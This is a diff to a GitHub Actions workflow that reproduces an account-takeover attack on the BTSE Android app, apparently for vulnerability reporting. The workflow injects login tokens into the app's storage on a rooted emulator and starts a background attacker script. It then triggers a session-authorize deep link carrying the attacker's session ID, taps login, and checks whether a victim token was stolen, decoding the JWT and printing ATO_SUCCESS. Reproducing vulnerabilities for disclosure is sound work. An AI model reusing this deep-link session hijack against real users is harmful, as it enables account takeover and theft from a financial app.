@@ -92,48 +92,119 @@ jobs:
           test -n "$SIGNED" || { echo NO_SIGNED_APK; exit 1; }
           "$ZA" -c -p 4 "$SIGNED" && echo FINAL_ALIGN_OK || echo FINAL_ALIGN_BAD
           ls -la /tmp/apks/out/
-      - name: install + launch + verdict
+      - name: install + inject login
+        env:
+          BTSE_LOGIN_TOKEN: ${{ secrets.BTSE_LOGIN_TOKEN }}
+          BTSE_REFRESH_TOKEN: ${{ secrets.BTSE_REFRESH_TOKEN }}
+          BTSE_USER: ${{ secrets.BTSE_USER }}
+          BTSE_EMAIL: ${{ secrets.BTSE_EMAIL }}
         run: |
           export PATH=$ANDROID_HOME/platform-tools:$PATH
           APK=$(ls /tmp/apks/out/*debugSigned.apk 2>/dev/null | head -1)
           if [ -z "$APK" ]; then echo "NO_SIGNED_APK"; exit 1; fi
           adb install -r "$APK" || adb install "$APK"
-          adb shell dumpsys package com.btse.finance 2>/dev/null | grep -iE "primaryCpuAbi|legacyNativeLibraryDir" | head -4 || true
-          adb shell ls /data/app/*/com.btse.finance*/lib/x86_64/ 2>/dev/null | head -5 || true
+          adb shell dumpsys package com.btse.finance 2>/dev/null | grep -iE "primaryCpuAbi" | head -2 || true
+          for p in POST_NOTIFICATIONS READ_PHONE_STATE GET_ACCOUNTS READ_EXTERNAL_STORAGE WRITE_EXTERNAL_STORAGE CAMERA RECORD_AUDIO ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION READ_MEDIA_IMAGES READ_MEDIA_VIDEO READ_MEDIA_AUDIO ACTIVITY_RECOGNITION; do
+            adb shell pm grant com.btse.finance android.permission.$p 2>/dev/null || true
+          done
           adb logcat -c || true
-          RESOLVED=$(adb shell cmd package resolve-activity --brief com.btse.finance 2>/dev/null | tail -1 | tr -d '\r') || true
-          echo "RESOLVED=$RESOLVED"
           adb shell am start -W -n com.btse.finance/com.example.project.ui.launch.LaunchActivity > /tmp/amstart.txt 2>&1 || true
-          echo "AMSTART:"; cat /tmp/amstart.txt
-          sleep 40
-          PID=$(adb shell pidof com.btse.finance 2>/dev/null | tr -d '\r' || true)
-          echo "PID=$PID"
+          echo "AMSTART1:"; cat /tmp/amstart.txt
+          sleep 25
+          echo "PID1=$(adb shell pidof com.btse.finance 2>/dev/null | tr -d '\r' || true)"
           adb shell dumpsys window 2>/dev/null | grep mCurrentFocus || true
-          adb shell wm size
+          adb shell screencap -p /sdcard/s1.png || true
+          adb pull /sdcard/s1.png /tmp/s1.png >/dev/null 2>&1 || true
+          echo "OCR1=$(tesseract /tmp/s1.png stdout 2>/dev/null | tr '\n' ' ' | head -c 250)"
+          adb root >/dev/null 2>&1 || true
+          sleep 3
+          adb wait-for-device
+          adb shell am force-stop com.btse.finance
+          python3 tools/fill_prefs.py tools/base_template.xml /tmp/base.xml
+          adb shell mkdir -p /data/data/com.btse.finance/shared_prefs
+          adb push /tmp/base.xml /data/data/com.btse.finance/shared_prefs/base.xml
+          APPUID=$(adb shell stat -c %u /data/data/com.btse.finance 2>/dev/null | tr -d '\r' || true)
+          echo "APPUID=$APPUID"
+          adb shell chown -R $APPUID:$APPUID /data/data/com.btse.finance/shared_prefs || true
+          adb shell chmod 660 /data/data/com.btse.finance/shared_prefs/base.xml || true
+          adb shell ls -la /data/data/com.btse.finance/shared_prefs/
+          echo "INJECT_DONE"
+      - name: launch + login check
+        run: |
+          export PATH=$ANDROID_HOME/platform-tools:$PATH
+          adb logcat -c || true
+          adb shell am start -W -n com.btse.finance/com.example.project.ui.launch.LaunchActivity > /tmp/amstart2.txt 2>&1 || true
+          echo "AMSTART2:"; cat /tmp/amstart2.txt
+          sleep 40
+          PID2=$(adb shell pidof com.btse.finance 2>/dev/null | tr -d '\r' || true)
+          echo "PID2=$PID2"
+          adb shell dumpsys window 2>/dev/null | grep mCurrentFocus || true
+          adb shell screencap -p /sdcard/s2.png || true
+          adb pull /sdcard/s2.png /tmp/s2.png >/dev/null 2>&1 || true
+          OCR2=$(tesseract /tmp/s2.png stdout 2>/dev/null | tr '\n' ' ' | head -c 500)
+          echo "OCR2=$OCR2"
+          if echo "$OCR2" | grep -qiE "log ?in|sign ?in|password|welcome back"; then
+            echo "LOGIN_GUESS=LOGIN_SCREEN"
+          elif echo "$OCR2" | grep -qiE "assets|markets|withdraw|deposit|portfolio"; then
+            echo "LOGIN_GUESS=HOME"
+          else
+            echo "LOGIN_GUESS=UNKNOWN"
+          fi
+          adb logcat -d > /tmp/logcat.txt 2>/dev/null || true
+          FATALJ=$(grep -c "FATAL EXCEPTION" /tmp/logcat.txt || true)
+          FATALN=$(grep -c "Fatal signal" /tmp/logcat.txt || true)
+          WIPED=$(grep -c "10028" /tmp/logcat.txt || true)
+          echo "FATALJ=$FATALJ FATALN=$FATALN code10028=$WIPED"
+          grep -iE "UnsatisfiedLinkError|dlopen failed" /tmp/logcat.txt | head -6 || true
+      - name: attack chain + verdict
+        run: |
+          export PATH=$ANDROID_HOME/platform-tools:$PATH
+          python3 tools/poc_attacker.py > /tmp/attack.log 2>&1 &
+          ATK=$!
+          for i in $(seq 1 30); do [ -s poc_sid.txt ] && break; sleep 1; done
+          SID=$(cat poc_sid.txt 2>/dev/null || true)
+          echo "SID=$SID"
+          if [ -n "$SID" ]; then
+            adb shell am start -a android.intent.action.VIEW -d "app://app.btse.com/app/session/authorize?sessionId=$SID" com.btse.finance > /tmp/dl.txt 2>&1 || true
+            echo "DEEPLINK:"; cat /tmp/dl.txt
+            sleep 12
+            adb shell screencap -p /sdcard/s3.png || true
+            adb pull /sdcard/s3.png /tmp/s3.png >/dev/null 2>&1 || true
+            echo "OCR3=$(tesseract /tmp/s3.png stdout 2>/dev/null | tr '\n' ' ' | head -c 300)"
+            adb shell input tap 540 2002
+            echo "TAP_LOGIN"
+            sleep 8
+            adb shell screencap -p /sdcard/s4.png || true
+            adb pull /sdcard/s4.png /tmp/s4.png >/dev/null 2>&1 || true
+            echo "OCR4=$(tesseract /tmp/s4.png stdout 2>/dev/null | tr '\n' ' ' | head -c 300)"
+          fi
+          for i in $(seq 1 45); do [ -s stolen_token.txt ] && break; sleep 2; done
+          kill $ATK 2>/dev/null || true
+          adb shell screencap -p /sdcard/s5.png || true
+          adb pull /sdcard/s5.png /tmp/s5.png >/dev/null 2>&1 || true
+          adb shell dumpsys window 2>/dev/null | grep mCurrentFocus || true
           adb logcat -d > /tmp/logcat.txt 2>/dev/null || true
           FATALJ=$(grep -c "FATAL EXCEPTION" /tmp/logcat.txt || true)
           FATALN=$(grep -c "Fatal signal" /tmp/logcat.txt || true)
           echo "FATALJ=$FATALJ FATALN=$FATALN"
-          grep -B2 -A18 -E "FATAL EXCEPTION|Fatal signal" /tmp/logcat.txt | head -80 || true
-          grep -iE "UnsatisfiedLinkError|dlopen failed|cannot locate symbol" /tmp/logcat.txt | head -15 || true
-          adb shell am start -a android.intent.action.VIEW -d "app://app.btse.com/app/session/authorize?sessionId=11111111-2222-3333-4444-555555555555" com.btse.finance > /tmp/dl.txt 2>&1 || true
-          echo "DEEPLINK:"; cat /tmp/dl.txt
-          sleep 15
-          PID2=$(adb shell pidof com.btse.finance 2>/dev/null | tr -d '\r' || true)
-          echo "PID2=$PID2"
-          adb shell dumpsys window 2>/dev/null | grep mCurrentFocus || true
-          adb logcat -d > /tmp/logcat.txt 2>/dev/null || true
-          FATALJ=$(grep -c "FATAL EXCEPTION" /tmp/logcat.txt || true)
-          FATALN=$(grep -c "Fatal signal" /tmp/logcat.txt || true)
-          echo "FINAL FATALJ=$FATALJ FATALN=$FATALN"
-          adb shell screencap -p /sdcard/launch.png || true
-          adb pull /sdcard/launch.png /tmp/launch.png >/dev/null 2>&1 || true
-          tesseract /tmp/launch.png stdout 2>/dev/null | tr '\n' ' ' | head -c 600; echo
-          if [ -n "$PID2" ] && [ "$FATALJ" = "0" ] && [ "$FATALN" = "0" ]; then echo "VERDICT=APP_RUNNING"; else echo "VERDICT=APP_DIED"; fi
+          if [ -s stolen_token.txt ]; then
+            python3 -c "import json,base64; t=open('stolen_token.txt').read().strip(); p=t.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p)); print('ATO_CLAIMS', json.dumps({k:c.get(k) for k in ('username','iss','iat','exp')})); print('TOKEN_LEN', len(t))"
+            echo "VERDICT=ATO_SUCCESS"
+          else
+            echo "VERDICT=NO_ATO"
+          fi
+          sed -i 's/eyJ[A-Za-z0-9_-]\{10,\}\.[A-Za-z0-9_-]\{10,\}\.[A-Za-z0-9_-]\{10,\}/<JWT>/g' /tmp/attack.log /tmp/logcat.txt 2>/dev/null || true
+          echo "=== attack.log (redacted) ==="
+          tail -c 3000 /tmp/attack.log
       - uses: actions/upload-artifact@v4
         if: always()
         with:
-          name: stub-launch
+          name: poc-run
           path: |
-            /tmp/launch.png
+            /tmp/s1.png
+            /tmp/s2.png
+            /tmp/s3.png
+            /tmp/s4.png
+            /tmp/s5.png
             /tmp/logcat.txt
+            /tmp/attack.log
